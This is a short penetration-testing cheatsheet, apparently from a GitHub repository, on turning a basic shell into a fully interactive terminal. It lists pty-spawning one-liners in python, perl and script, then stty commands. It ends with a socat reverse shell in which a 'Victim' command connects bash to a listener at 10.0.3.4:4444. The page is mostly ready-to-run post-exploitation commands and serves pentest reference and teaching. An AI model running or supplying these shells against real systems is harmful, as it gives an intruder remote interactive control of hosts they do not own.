# Interactive Shell

### [Spawn Shells](https://github.com/iptracej/MyPentestCheatsheet/blob/main/FullTTYs.md#spawn-shells) <a href="#user-content-spawn-shells" id="user-content-spawn-shells"></a>

Using STTY options, run one of the followings:

```
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -I
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/sh";'
```

Then, run:

```
ctrl-z

echo $TERM
stty raw -echo
fg
reset

export SHELL=bash
export TERM=screen-256color
stty rows 61 columns 205
```

### [Other ways to spawn Shells](https://github.com/iptracej/MyPentestCheatsheet/blob/main/FullTTYs.md#other-ways-to-spawn-shells) <a href="#user-content-other-ways-to-spawn-shells" id="user-content-other-ways-to-spawn-shells"></a>

Using socat

```
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

Reference: [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
